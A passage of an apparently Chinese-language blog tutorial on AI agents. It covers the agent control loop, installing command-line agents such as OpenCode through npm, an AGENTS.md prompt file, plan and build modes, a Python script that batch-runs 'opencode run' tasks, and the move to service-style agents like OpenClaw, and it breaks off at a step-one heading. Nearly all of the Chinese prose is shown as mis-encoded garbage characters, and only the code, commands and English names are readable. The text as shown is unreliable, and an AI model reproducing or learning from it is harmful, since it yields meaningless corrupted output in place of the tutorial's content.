<p>è¿ä¸ªå¾ªç¯ç»æä¼æç»­è¿è¡ä¸å»ï¼ç´å°ä»»å¡å®æææ»¡è¶³ç»æ­¢æ¡ä»¶ãä»è¯¥æ§è¡æ¨¡å¼å¯ä»¥çåºï¼ä¸ä¸ªå¸åç AI Agent åºç¨éå¸¸åå«ä»¥ä¸å ä¸ªæ ¸å¿ç»ä»¶ï¼</p>
<ul>
<li><strong>LLM</strong>ï¼è¯¥ç»ä»¶è´è´£çè§£å½åä»»å¡ç®æ ãåæä¸ä¸æç¶æå¹¶çæä¸ä¸æ­¥è¡å¨å³ç­ï¼ä¸è´è´£ç´æ¥æ§è¡å¤é¨æä½ï¼</li>
<li><strong>å·¥å·æ¥å£</strong>ï¼è¯¥ç»ä»¶è´è´£å° LLM çæçç»æåæä»¤è½¬æ¢ä¸ºå®éå¯æ§è¡çæä½ï¼ä¾å¦ï¼è°ç¨ APIãè®¿é®æ°æ®åºãè¯»åæä»¶ãæ§è¡ç³»ç»å½ä»¤ãè§¦åå¤é¨æå¡ç­ãå®ä»¬éå¸¸ç±å¼åèå®ä¹ï¼å¹¶éè¿å½æ°è°ç¨ææä»¶æºå¶æ´é²ç»æ¨¡åï¼</li>
<li><strong>ç¶æç®¡ç</strong>ï¼è¯¥ç»ä»¶è´è´£ç»´æ¤ä»»å¡çä¸­é´ç¶æï¼ä¾å¦ï¼å½åä»»å¡è¿åº¦ãå·²æ§è¡æ­¥éª¤ãå¤é¨ç¯å¢ååãåå²å³ç­è®°å½ç­ãè¿äºç¶æéå¸¸ä¼è¢«å­å¨å¨åå­åéãæ°æ®åºãåéå­å¨ãæä»¶ç³»ç»ç­ä»è´¨ä¸­ï¼å¦æç¼ºä¹ææçç¶æç®¡çæºå¶ï¼æä»¬å°±é¾ä»¥æå»ºä¸ä¸ªçæ­£ç Agent åºç¨ï¼</li>
<li><strong>æ§å¶å¨</strong>ï¼è¯¥ç»ä»¶è´è´£é©±å¨å¾ªç¯ãå¤æ­æ¯å¦ç»§ç»­æ§è¡ãè§£ææ¨¡åè¾åºãè°ç¨å¯¹åºå·¥å·ãå¤çå¼å¸¸ä¸å¤±è´¥éè¯ãä»æ¶æè§åº¦æ¥çï¼æ§å¶å¨å¯è¢«è§ä¸º Agent ç³»ç»çâéª¨æ¶âï¼è LLM åªæ¯å¶ä¸­çå³ç­æ¨¡åã</li>
</ul>
<p>åºäºä»¥ä¸æ ¸å¿ç»ä»¶ï¼æä»¬å°±å¯ä»¥ç®åå°å½çº³åºä¸ä¸ª Agent åºç¨çå·¥ä½æµç¨ï¼å¶ä¸»è¦æ­¥éª¤å¦ä¸ï¼</p>
<ol>
<li>æ¥æ¶ä»»å¡ç®æ </li>
<li>å°ç®æ ä¸å½åç¶æè¾å¥ LLM</li>
<li>LLM è¾åºä¸ä¸æ­¥è¡å¨è®¡åï¼éå¸¸ä¸ºç»æåæ ¼å¼ï¼</li>
<li>æ§å¶å¨è§£æè¾åº</li>
<li>è°ç¨ç¸åºå·¥å·æ§è¡</li>
<li>æ´æ°ç¶æ</li>
<li>å¤æ­æ¯å¦å®æä»»å¡</li>
<li>è¥æªå®æï¼åè¿å¥ä¸ä¸è½®å¾ªç¯</li>
</ol>
<p>ä»å·¥ç¨è§åº¦æ¥çï¼AI Agent æ¯ä¸ç§æ°çç³»ç»æ¶ææ¨¡å¼ï¼å®éè¿æç»­è¿è¡çæ§å¶å¾ªç¯ï¼ä½¿æ¨¡åè½å¤åä¸çå®ä»»å¡çæ§è¡è¿ç¨ï¼èä¸ä»ä»æ¯çæææ¬ç»æã</p>
<h2 id="ai-agent-çä½¿ç¨æ¹æ³">AI Agent çä½¿ç¨æ¹æ³</h2>
<p>å¨äºè§£äºä½¿ç¨ AI Agent çå¿è¦æ§åå¶å·¥ä½åçä¹åï¼æ¥ä¸æ¥å°±å¯ä»¥æ­£å¼å¼å§ç ç©¶å¦ä½å°å®è¿ç¨å°èªå·±çæ¥å¸¸å·¥ä½ä¸­äºãèå½æä»¬è¦è®¨è®º AI Agent å¨å®éå·¥ä½ä¸­çä½¿ç¨æ¹æ³æ¶ï¼é¦åéè¦åç­çé®é¢æ¯âå®è¿è¡å¨åªéãç±è°æ§å¶ãæ¿æä»ä¹è´£ä»»âãä¸åçè¿è¡å½¢æï¼å³å®äºå®å¨å·¥ç¨ç³»ç»ä¸­çè§è²è¾¹çãä¸é¢ï¼è®©æä»¬æç§"è¿è¡å¨åªé"è¿ä¸ªç»´åº¦åä¸ç±»æ¥ä»ç» AI Agent çä½¿ç¨æ¹æ³ï¼ä»¥åå®ä»¬å¨è¿äºåºç¨åºæ¯ä¸­ææ¿æçä»»å¡è§è²ã</p>
<h3 id="å½ä»¤è¡å·¥å·å-agent">å½ä»¤è¡å·¥å·å Agent</h3>
<p>å¯¹äºå¤§å¤æ°å¼åèèè¨ï¼ä»¥å½ä»¤è¡å·¥å·çå½¢å¼ä½¿ç¨ AI Agent æ¯ä¸ç§æ´ç¬¦åå·¥ç¨ç´è§çæ¹å¼ãå®è¿è¡å¨çæçç»ç«¯ç¯å¢ä¸­ï¼å¯ä»¥ç´æ¥è®¿é®æä»¶ç³»ç»ä¸ç³»ç»å½ä»¤ï¼å æ­¤çèµ·æ¥ç±»ä¼¼äºèªå¨åèæ¬ãå½ç¶äºï¼ä¸ä¼ ç»èæ¬ä¸åçæ¯ï¼AI Agent çåé¨å³ç­è·¯å¾å¹¶éé¢åç¼åï¼èæ¯ç± LLM å¨å¾ªç¯ç»æä¸­å¨æçæãè¿ç±» AI Agent åºç¨çå¸åä»£è¡¨æ¯ <a href="https://github.com/anthropics/claude-code" target="_blank" rel="noopener nofollow">Claude Code</a>ï¼ç®ååç±»çä¸»æµåºç¨è¿åæ¬ <a href="https://github.com/anomalyco/opencode" target="_blank" rel="noopener nofollow">OpenCode</a>ã<a href="https://github.com/openai/codex" target="_blank" rel="noopener nofollow">Codex CLI</a>ã<a href="https://github.com/google-gemini/gemini-cli" target="_blank" rel="noopener nofollow">Gemini CLI</a>ã<a href="https://github.com/iflow-ai/iflow-cli" target="_blank" rel="noopener nofollow">iFlow CLI</a> ç­ãä¸é¢ï¼æä»¬é¦åè¦åçå°±æ¯ï¼åå°è¿äºå·¥å·å®è£å°èªå·±æå¨çæä½ç³»ç»ä¸­ã</p>
<h4 id="å®è£ä¸éç½®">å®è£ä¸éç½®</h4>
<p>å½ä»¤è¡å·¥å·å Agent çå®è£æ¹å¼å¶å®æ¯éå¸¸ç®åçãå ä¸ºï¼è½ç¶å®ä»¬åèªéå¯¹ MacOS/Linux/Windows ç³»ç»æä¾äºä¸åç bash/powershell å®è£èæ¬ï¼æèåºäº homeberw/pacman/scoop ç­éå¯¹ä¸åæä½ç³»ç»å¹³å°çåç®¡çå¨å®è£å½ä»¤ï¼ä½åºæ¬é½æä¾äºåºäº NPM è¿ä¸åç®¡çå¨çè·¨å¹³å°å®è£æ¹å¼ãæä»¥ï¼è¯»èå¨å¤§å¤æ°æåµä¸é½å¯ä»¥æç§ä»¥ä¸æ­¥éª¤æ¥å®è£å¹¶ä½¿ç¨è¿äºå·¥å·ï¼</p>
<ol>
<li>
<p>ç¡®ä¿èªå·±æå¨çæä½ç³»ç»ä¸­å·²ç»å®è£äºçæ¬å¨ 20.0.0 ä¹ä¸ç Node.js è¿è¡ç¯å¢ï¼å¶ä¸­èªå¸¦äº NPM åç®¡çå¨ï¼</p>
</li>
<li>
<p>å¨ç®¡çåæéä¸æ§è¡<code>npm install -g &lt;agent-name&gt;@&lt;version&gt;</code>å½ä»¤ï¼å¨è¿éï¼<code>&lt;agent-name&gt;</code>å¯ä»¥éè¿æ¥è¯¢ç¸å³å·¥å·çå®æ¹ç½ç«æ¥è·å¾ï¼è<code>&lt;version&gt;</code>åé¤äºå¯ä»¥æ¯æä»¬å¨å·¥å·å®ç½ä¸­æ¥å°çå·ä½çæ¬å·ä¹å¤ï¼ä¹å¯ä»¥ç¨<code>latest</code>æ¥è¡¨ç¤ºææ°çæ¬ãä¾å¦ï¼å¦ææä»¬éè¦å®è£ææ°çæ¬ç OpenCodeï¼å°±åªéè¦å¨å½ä»¤è¡ç»ç«¯ä¸­ä½¿ç¨ç®¡çåæéæ§è¡<code>npm install -g opencode@latest</code>å½ä»¤å³å¯ã</p>
</li>
</ol>
<p>å¨å®è£å®æä¹åï¼æä»¬å°±å¯ä»¥ç¨ CLI å TUI ä¸¤ç§æ¹å¼æ¥ä½¿ç¨è¿ç§å½ä»¤è¡å·¥å·åç Agent äºãå¶ä¸­ï¼TUI çæ¹å¼å·²ç»è¢«å¤§å®¶æçç¥ï¼å®å®éä¸å°±æ¯ä¸ä¸ªåºäºå½ä»¤è¡çé¢çäº¤äºå¼ç¨åºï¼è¿ä½æ¹å¼ç±»ä¼¼äº Python Shell æ Node.js REPLï¼æ¥æå±äºèªå·±çç¬ç«çº¿ç¨ãä¾å¦å¨å®è£å® OpenCode ä¹åï¼æä»¬åªéè¦ç´æ¥å¨å½ä»¤è¡ç»ç«¯ä¸­è¾å¥<code>opencode</code>å½ä»¤ï¼å¦ææ³å»¶ç»­ä¹åä¸ OpenCode çä¼è¯ï¼è¿å¨è¯¥å½ä»¤åé¢å ä¸ä¸ä¸ª<code>--continue</code>æ<code>-c</code>åæ°ï¼ï¼å°±å¯ä»¥å¯å¨å®ç TUI çé¢äºï¼å·ä½å¦å¾ 1 æç¤ºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160322816-1525296787.png" class="lazyload"></p>
<p><strong>å¾ 1</strong>ï¼OpenCode TUI çé¢</p>
<p>å¨åæ¬¡è¿å¥ä¸æ¬¡çé¢æ¶ï¼æä»¬å¯ä»¥å¯¹èªå·±ä½¿ç¨ç AI Agent è¿è¡ä¸äºåºæ¬çéç½®ï¼è¿äºå·¥å·çéç½®æ¹å¼åºæ¬ä¸æ¯å¤§åå°å¼çãä¸è¬æ¥è¯´ï¼æä»¬ä¼åä½¿ç¨<code>/model</code>å½ä»¤è®¾ç½®ä»¥ä¸èªå·±é»è®¤è¦ä½¿ç¨ç LLMï¼ä¾å¦æ¨å¨å¾ 2 ä¸­æçå°çå°±æ¯ OpenCode ç LLM éæ©çé¢ï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160253302-210062309.png" class="lazyload"></p>
<p><strong>å¾ 2</strong>ï¼OpenCode LLM éæ©çé¢</p>
<p>éå¸¸æåµä¸ï¼å¨éæ© LLM ä¹åï¼è¿äº AI Agent ä¼è¦æ±æä»¬æä¾ä¸ä¸ª API Keyï¼ç¨äºå¨è°ç¨ LLM æ¶è¿è¡èº«ä»½éªè¯ãè¿ä¸ª API key å¯ä»¥éè¿ç»å½æä»¬å¨ç¸åº LLM å®ç½çä¸ªäººè´¦æ·æ¥è·å¾ãä¾å¦ï¼æå¨è¿ééæ©ä½¿ç¨çæ¯æºæ®ç GLM æ¨¡åï¼å°±éè¦ç»å½å°<a href="https://bigmodel.cn/" target="_blank" rel="noopener nofollow">æºæ® AI çå®ç½</a>ï¼å¹¶ä¸º OpenCode åå»ºä¸ä¸ªä¸å±ç API Keyï¼å¦å¾ 3 æç¤ºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160222119-632981045.png" class="lazyload"></p>
<p><strong>å¾ 3</strong>ï¼åå»ºæºæ® AI ç API Key</p>
<p>æ¥ä¸æ¥ï¼æä»¬å°±åªéè¦å°ä¸è¿° API Key å¤å¶å° OpenCode æç¤ºè¾å¥ key çä½ç½®ï¼å¹¶éæ©å·ä½è¦ä½¿ç¨ç GLM çæ¬å¹¶ç¡®è®¤å³å¯ãå®æè¿äºéç½®ä¹åï¼æä»¬å°±å¯ä»¥éè¿ä¸ä¸ª AI Agent ççâHello Worldâæµè¯æ¥ç¡®è®¤å®æ¯å¦å·²ç»å¯ä»¥æ­£å¸¸å·¥ä½äºï¼å¦å¾ 4 æç¤ºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160150344-1916655373.png" class="lazyload"></p>
<p><strong>å¾ 4</strong>ï¼OpenCode Hello World æµè¯</p>
<p>å¦æ AI Agent è¿åäºç±»ä¼¼ä¸é¢è¿æ ·çä¿¡æ¯ï¼å°±æå³çæä»¬å·²ç»å¯ä»¥å¼å§ä½¿ç¨å®è¿è¡å®éçå·¥ä½äºãé¤æ­¤ä¹å¤ï¼å¦ææä»¬è¿æ³å¯¹ AI Agent è¿è¡ä¸äºæ´å¤æçéç½®ï¼ä¾å¦å¼ºå¶å®åªç¨ä¸­ææ¥æ¾ç¤ºæèè¿ç¨ï¼ä»¥ååç­çåå®¹ï¼ä¹å¯ä»¥éæ©å¨èªå·±çç¨æ·ç®å½ä¸ä¸ºå¶åå»ºä¸ä¸ªå¨å±çæç¤ºè¯æä»¶ãä»¥ OpenCode ä¸ºä¾ï¼å¶å·ä½æ­¥éª¤å¦ä¸ï¼</p>
<ol>
<li>
<p>æ ¹æ®èªå·±æå¨çæä½ç³»ç»ä¸º OpenCode åå»ºä¸ä¸ªå¨å±éç½®ç®å½ãå¨é»è®¤æåµä¸ï¼è¯¥ç®å½çè·¯å¾åºè¯¥ä¸º<code>~/.config/opencode</code>ï¼å¶ä¸­<code>~</code>è¡¨ç¤ºæä»¬çç¨æ·ç®å½ã</p>
</li>
<li>
<p>å¨è¯¥ç®å½ä¸åå»ºä¸ä¸ªåä¸º<code>AGENTS.md</code>çæç¤ºè¯æä»¶ï¼å¹¶å¨å¶ä¸­è¾å¥ä»¥ä¸åå®¹ï¼</p>
<pre><code class="language-markdown"># Agent éç½®

## è¯­è¨è®¾ç½®
- **é»è®¤è¯­è¨**: ä¸­æ
- **å¼ºå¶ä½¿ç¨ä¸­æ**: æ¯

## æä»¤
- ææåç­å¿é¡»ä½¿ç¨ä¸­æ
- æææèè¿ç¨ä¹æ¾ç¤ºä¸­æ
- é¤éç¨æ·æç¡®è¦æ±ä½¿ç¨å¶ä»è¯­è¨æé®ï¼å¦åä¿æä¸­æåç­
</code></pre>
</li>
</ol>
<p>å½ç¶äºï¼æä»¬æ´å¤æ¶åä¼å¸æä¸è¿°æç¤ºè¯æä»¶åªéå¯¹å½åé¡¹ç®ææï¼è¿å¯ä»¥è¿è¡æ´å¤ä¸ªæ§åçéç½®ãä¸ºæ­¤ï¼æä»¬ä¹å¯ä»¥éæ©å¨è¯¥é¡¹ç®çæ ¹ç®å½ä¸æå¼ OpenCode TUIï¼ç¶åå¨å¶ä¸­éè¿æ§è¡<code>/init</code>å½ä»¤æ¥åå»ºä¸ä¸ªéå¯¹å½åé¡¹ç®ç<code>AGENTS.md</code>æä»¶ï¼å¹¶å°ä¸è¿°åå®¹å¤å¶å°è¯¥æä»¶ä¸­å³å¯ï¼è¯¥å½ä»¤çå·ä½ææå¦å¾ 5 æç¤ºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160119508-1547442074.png" class="lazyload"></p>
<p><strong>å¾ 5</strong>ï¼OpenCode çé¡¹ç®åå§åå½ä»¤</p>
<p>è³äºå¶ä» AI Agentï¼è½ç¶ä¼å¨å¨å±éç½®ç®å½ä¸æç¤ºè¯æä»¶ä¸æåèªçåç§°ï¼ä½åºç¨çå·¥ä½æµ/æºå¶åºæ¬æ¯å¤§åå°å¼çï¼ç¨æ·åªéç®åæ¥è¯¢ä¸ä¸å®ä»¬çå®æ¹ææ¡£ï¼å°±å¯ä»¥è½»æ¾åå°ä¸¾ä¸åä¸çï¼ä¾å¦éè¿å¿«éæ¥è¯¢ Claude Code çå®æ¹ææ¡£ï¼ç«å³å°±ä¼ç¥éå®çå¨å±æç¤ºè¯æä»¶è·¯å¾ä¸º<code>~/.claude/claude.md</code>ã</p>
<blockquote>
<p>é¡ºä¾¿è¯´ä¸å¥é¢å¤è¯ï¼è½ç¶ Claude Code å¨åæ¹é¢é½ä¸º AI Agent åºç¨å»ºç«äºæ¥è¿äºæ åçå·¥ä½æµ/æºå¶ï¼ä½èèå°å¶å®æ¹çæäºåæ³ä¼ç»ä¸­æç¨æ·å¸¦æ¥è¯¸å¤æ²¡å¿è¦çé¢å¤éç½®ï¼æå¨æ¥ä¸æ¥è¿æ¯ä¼ä»¥ OpenCode ä¸ºä¾è¿è¡è¯´æãå¦æè¯»èæ³åå®äºè§£ Claude Code çæäºå·ä½ç¨æ³ï¼ä¹å¯åèæ¬æå¨âåèèµæâä¸èä¸­æä¾çè§é¢æç¨ï¼ãClaude Code æç¨ãã</p>
</blockquote>
<h4 id="åºæ¬æä½æ¹å¼">åºæ¬æä½æ¹å¼</h4>
<p>ä¸é¢ï¼è®©æä»¬æ¥å·ä½ä»ç»ä¸ä¸å½ä»¤è¡å·¥å·å Agent çåºæ¬æä½æ¹å¼ï¼æ­£å¦ä¹åæè¯´ï¼è¿ç±»å½ä»¤è¡å·¥å·éå¸¸æ CLI å TUI ä¸¤ç§ä½¿ç¨æ¹å¼ï¼TUI ä¼åç¬æå¼ä¸ä¸ªå·¥ä½çº¿ç¨æ¥æ§è¡äº¤äºå¼æä½ï¼éå¸¸ç¨äºæ§è¡ä¸äºéè¦ä½¿ç¨å¤è½®æç¤ºè¯äº¤äºï¼å¹¶ç¡®è®¤åå®¹çå¤æä»»å¡ãå æ­¤ï¼è¿äº Agent åºç¨ç TUI å¾å¾è³å°ä¼æä¾âè®¡åï¼planï¼âåâæå»ºï¼buildï¼âä¸¤ä¸ªæ¨¡å¼ï¼ä¸ªå« Agent è¿ä¼æä¾âèªå¨ï¼autoï¼âä¹ç±»çç¬¬ä¸ç§æ¨¡å¼ï¼æèå¨æ¨¡å¼åç§°ä¸å­å¨å·®å¼ï¼ä½å¶å¨åºæ¬ä½¿ç¨é»è¾ä¸æ¯ä¸è´çï¼ï¼å¶ä¸­ï¼âè®¡åâæ¨¡å¼éå¸¸æ²¡ææ§è¡å¤é¨å½ä»¤çæéï¼ä¸»è¦ç¨äºä¸ LLM æ§è¡å¤è½®äº¤äºï¼å¹¶ç¡®è®¤æä¸æä»»å¡çè§£å³æ¹æ¡ãä¾å¦å¨ä¹åå±ç¤ºç OpenCode TUI ä¸­ï¼è¯»èå¯ä»¥å¨å¶è¾å¥æ¡çä¸æ¹çå°ï¼å®é»è®¤å¤äºâæå»ºâæ¨¡å¼ãç°å¨ï¼æä»¬å¯ä»¥éè¿è¾å¥<code>&lt;tab&gt;</code>é®æ¥å°å¶åæ¢å°âè®¡åâæ¨¡å¼ï¼ç¶ååè¯çè®©å®æ§è¡âä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ª hello world ç¨åºâçæä½ï¼å°±ä¼å¾å°ç±»ä¼¼å¾ 5 çè¾åºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160040673-1077571178.png" class="lazyload"></p>
<p><strong>å¾ 6</strong>ï¼OpenCode çè®¡åæ¨¡å¼</p>
<p>æ­£å¦è¯»èæè§ï¼ç°å¨ OpenCode TUI è¾å¥æ¡ä¸é¢æç¤ºå¶å½åå¤äºâè®¡åâæ¨¡å¼ï¼å¹¶ä¸åè¯ç¨æ·èªå·±å½åä¸è½ç¼è¾æä»¶åæ§è¡ç¨åºï¼ç¶åå¼å§ä¸ç¨æ·è®¨è®ºä»»å¡çå·ä½è§£å³æ¹æ¡ãèå½æä»¬åæ¢å°âæå»ºâæ¨¡å¼æ¶ï¼OpenCode å°±ä¼ç´æ¥æ§è¡è¿ä¸ªè§£å³æ¹æ¡ï¼å¹¶è¾åºç±»ä¼¼å¾ 7 çç»æï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218160004275-1878144736.png" class="lazyload"></p>
<p><strong>å¾ 7</strong>ï¼OpenCode çæå»ºæ¨¡å¼</p>
<p>å½ç¶äºï¼å°±ä¸é¢è¿ç§ä»éä¸å¥ç®ç­çæç¤ºè¯å°±å¯ä»¥å®æçä»»å¡èè¨ï¼æä»¬å®éä¸æ´éåä½¿ç¨ CLI çæ¹å¼æ¥æ§è¡ãè¿ç§æ¹å¼åè®¸æä»¬å¨ bash/powershell è¿ç±»å½ä»¤è¡ç»ç«¯ç¨åºæå¨çå½åçº¿ç¨ä¸­ç´æ¥æ§è¡ AI Agentï¼å¹¶è¾åºç»æãä¾å¦ï¼å¦ææä»¬æ³ä½¿ç¨ OpenCode CLI çæ¹å¼æ¥ç¼åå¹¶æ§è¡ä¸é¢é£ä¸ª Python ç¨åºï¼å¯ä»¥ç´æ¥å¨å½ä»¤è¡ç»ç«¯ä¸­è¾å¥<code>opencode run "ä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ª hello world ç¨åº"</code>å½ä»¤ï¼å¹¶å¾å°ç±»ä¼¼å¾ 8 çè¾åºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218155937910-1298759938.png" class="lazyload"></p>
<p><strong>å¾ 8</strong>ï¼OpenCode ç CLI æ¨¡å¼</p>
<p>å¦è¯»èæè§ï¼ä¸è¿°å½ä»¤ç´æ¥å¨ powershell æå¨çå½åçº¿ç¨ä¸­è¾åºäº OpenCode çæ§è¡ç»æãè¿æ ·åçå¥½å¤ï¼é¤äºé¿åå ä¸äºç®åçä»»å¡åå¤å¯å¨åå³é­ OpenCode TUI ä¹å¤ï¼å¨å¿è¦æåµä¸è¿å¯ä»¥ä½¿ç¨ Shell/Python è¿æ ·çèæ¬è¯­è¨æ¥å®ç°å¯¹ AI Agent åºç¨çæ¹éè°ç¨ï¼ä¾å¦ï¼å¦ææä»¬æ³ä½¿ç¨ Python èæ¬æ¹éè°ç¨ OpenCode CLI æ¥æ§è¡ 5 ä¸ªä¸åçä»»å¡ï¼å°±å¯ä»¥åä¸é¢è¿æ ·ç¼åä¸ä¸ªç®åç Python èæ¬ï¼</p>
<pre><code class="language-python">import subprocess

tasks = [
    "ä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ª hello world ç¨åº",
    "ä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ªè®¡ç®ææ³¢é£å¥æ°åçç¨åº",
    "ä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ªè®¡ç®é¶ä¹çç¨åº",
    "ä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ªè®¡ç®ç´ æ°çç¨åº",
    "ä½¿ç¨ Python ç¼åå¹¶æ§è¡ä¸ä¸ªè®¡ç®åææ°çç¨åº",
]

for task in tasks:
    try:
        result = subprocess.run(
            ["opencode", "run", task],
            capture_output=True,
            text=True,
            check=True,
            timeout=120
        )
        print(f"ä»»å¡æå: {task}")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"ä»»å¡å¤±è´¥: {task}")
        print(e.stderr)
    except subprocess.TimeoutExpired:
        print(f"ä»»å¡è¶æ¶: {task}")
</code></pre>
<p>é¤äº<code>opencode run</code>å½ä»¤ä¹å¤ï¼æä»¬è¿å¯ä»¥éè¿æ§è¡<code>opencode -h</code>å½ä»¤æ¥æ¥çå¶ä»å¯ç¨ CLI æ¹å¼æ§è¡ç OpenCode æä½ï¼å¦å¾ 9 æç¤ºï¼</p>

<p><img alt="img" loading="lazy" data-src="https://img2024.cnblogs.com/blog/691082/202602/691082-20260218155909459-1029247200.png" class="lazyload"></p>
<p><strong>å¾ 9</strong>ï¼OpenCode ç CLI å¸®å©ä¿¡æ¯</p>
<p>è½ç¶ï¼ä¸é¢è¿ç§å¤æ¬¡è°ç¨<code>opencode run</code>å½ä»¤çåæ³ï¼å¨æäºç¹å®çæåµä¸å¹¶ä¸æ¯æä½³çä»»å¡ç¼ææ¹å¼ãä¾å¦å¨æäºæ¶åï¼åå°ææçéæ±åå¥ä¸ä¸ª Markdown ææ¡£ä¸­ï¼åå°å¶ä½ä¸ºæç¤ºè¯ä¸æ¬¡æ§åç» AI Agent å¯è½ä¼æ¯ä¸ç§æ´åéçåæ³ãä½æ¯ï¼æä»¬å¯ä»¥åºäºè¿ä¸æè·¯åå±åºè®¸å¤æ´å¤æç AI Agent å·¥ä½æµï¼ä¾å¦å©ç¨é¨ç½²å¨æå¡ç«¯ç Agent æ¥æä½è¿äºå½ä»¤è¡å·¥å·åç Agentãä¸é¢ï¼å°±è®©æä»¬åºäº OpenClaw è¿ä¸å¯é¨ç½²æå¡åç AI Agent æ¥äºè§£ä¸ä¸è¿ä¸å·¥ä½æµçå·ä½å®ç°æ¹å¼ã</p>
<h3 id="å¯é¨ç½²æå¡å-agent">å¯é¨ç½²æå¡å Agent</h3>
<p>å¦ææä»¬å°å½ä»¤è¡å·¥å·åç AI Agent è§ä¸ºä¸ç§å¢å¼ºåçèªå¨åå·¥å·ï¼é£ä¹ä»¥ OpenClaw ä¸ºä»£è¡¨çãå¯å¨æå¡ç«¯é¨ç½²ç AI Agent åå°±æ¯ä¸ç§ç³»ç»çº§æ§è¡ååï¼äºèçå·®å¼ä¸»è¦å¨äºè¿è¡å½¢æä¸ç³»ç»è¾¹çãå·ä½æ¥è¯´å°±æ¯ï¼å½ä»¤è¡å·¥å·å Agent çè¿è¡æ¹å¼éå¸¸æ¯ï¼</p>
<ul>
<li>è¢«ç¨æ·è§¦å</li>
<li>æ§è¡ä¸è½®æå¤è½®ä»»å¡</li>
<li>è¾åºç»æ</li>
<li>éåºè¿ç¨</li>
</ul>
<p>èå¯é¨ç½²æå¡å Agent åå·æä»¥ä¸å®å¨ä¸åçç¹å¾ï¼</p>
<ul>
<li>å¸¸é©»è¿è¡</li>
<li>éè¿ HTTP / RPC / WebSocket ç­æ¹å¼å¯¹å¤æä¾è½å</li>
<li>æç»­ç»´æ¤ä¼è¯ç¶æ</li>
<li>æ¯æå¤ç¨æ·å¹¶åè®¿é®</li>
<li>å¯ä»¥è¢«å¶ä»ç³»ç»è°ç¨</li>
</ul>
<p>å¨è¿ç§å½¢æä¸ï¼Agent å°±ä¸åæ¯ä¸ä¸ªåè½ç±»ä¼¼äºèªå¨åèæ¬çå¢å¼ºåå·¥å·äºï¼å®æä¸ºäºå¸¸é©»å¨æä½ç³»ç»ä¸­çä¸ä¸ªæå¡ç»ä»¶ãå·ä½æ¥è¯´ï¼å¦æä»ç¨åºæ¶æçè§åº¦æ¥çï¼è¿ä¸¤ç§ Agent çå·®å«ä¸»è¦ä½ç°å¨ä»¥ä¸å ä¸ªæ¹é¢ï¼</p>
<ol>
<li>
<p>çå½å¨æç®¡çï¼å½ä»¤è¡å·¥å·å Agent ççå½å¨æéå¸¸æ¯ä¸æ¬¡æ§çï¼æ§è¡å®æå³éæ¯ï¼èå¯é¨ç½²æå¡å Agent åå·æé¿çå½å¨æï¼éè¦èèå¥åº·æ£æ¥ãæ¥å¿ç®¡çãå¼å¸¸æ¢å¤æºå¶ã</p>
</li>
<li>
<p>ä¼è¯ä¸ç¶æç®¡çï¼å½ä»¤è¡å·¥å·å Agent çç¶æéå¸¸ä¹æ¯ä¸æ¬¡æ§çï¼èå¯é¨ç½²æå¡å Agent åéè¦ç»´æ¤ä¼è¯ç¶æï¼è¿æå³çå®éè¦æ¯æç¨æ·çº§ä¼è¯éç¦»ãé¿æä¸ä¸æå­å¨ãè®°å¿æºå¶ï¼Memoryï¼ä»¥åå¤é¨æ°æ®åºæ¯æã</p>
</li>
<li>
<p>å¤ Agent ç¼æè½åï¼ä¸æ¦ Agent ä»¥ç³»ç»æå¡ç»ä»¶çå½¢å¼å­å¨ï¼å®å°±å¯ä»¥è°ç¨å¶ä» Agentï¼è¢«å¶ä» Agent è°ç¨ï¼åä¸æ´å¤æçä»»å¡é¾ãä¾å¦åè¿æ ·ï¼</p>
<pre><code class="language-plaintext">ç¨æ·è¯·æ±
â
è°åº¦ Agent
â
åæ Agent â ä»£ç çæ Agent â æµè¯ Agent
â
ç»ææ±æ»
</code></pre>
<p>è¿ç§æ§è¡ç»ææ¾ç¶å·²ç»ä¸åæ¯åçº¯çå·¥å·è°ç¨ï¼å®å³æ³¨çå®éä¸å·²ç»æ¯ä»»å¡çç¼æä¸è°åº¦äºãè¿ä¹å°±æå³çï¼æä»¬éè¦å¨æå¡åç Agent ä¸­å¼å¥ä»»å¡éåãæ¶æ¯éåãå¼æ­¥ä»»å¡è°åº¦ç³»ç»ç­æºå¶ã</p>
</li>
</ol>
<p>ä¸é¢ï¼è®©æä»¬ä»¥ OpenClaw ä¸ºä¾æ¥å·ä½ä»ç»ä¸ä¸ä½¿ç¨è¿ç§æå¡å Agent çä¸äºåºæ¬å·¥ä½æµãåè®¾ï¼æä»¬ç°å¨æ³ä½¿ç¨ OpenClaw ææ¥ OpenCode æ¥å®æä¸ä¸ªç®åçç½ç«éæä»»å¡ï¼éå¸¸éè¦æç§ä»¥ä¸æ­¥éª¤æ¥å®æã</p>
<h4 id="æ­¥éª¤-1å®è£å¹¶éç½®ä¸ä¸ª-openclaw-æå¡">æ­¥éª¤ 1ï¼å®è£å¹¶éç½®ä¸ä¸ª OpenClaw æå¡</h4>
